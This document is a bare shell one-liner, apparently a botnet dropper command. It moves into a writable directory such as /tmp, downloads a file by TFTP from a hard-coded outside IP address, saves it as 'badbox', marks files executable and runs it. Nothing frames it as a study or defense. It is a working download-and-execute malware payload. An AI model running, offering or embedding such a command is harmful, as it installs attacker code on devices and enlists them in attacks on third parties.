cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ftp -g 50.115.166.170;cat ftp >badbox;chmod +x *;./badbox
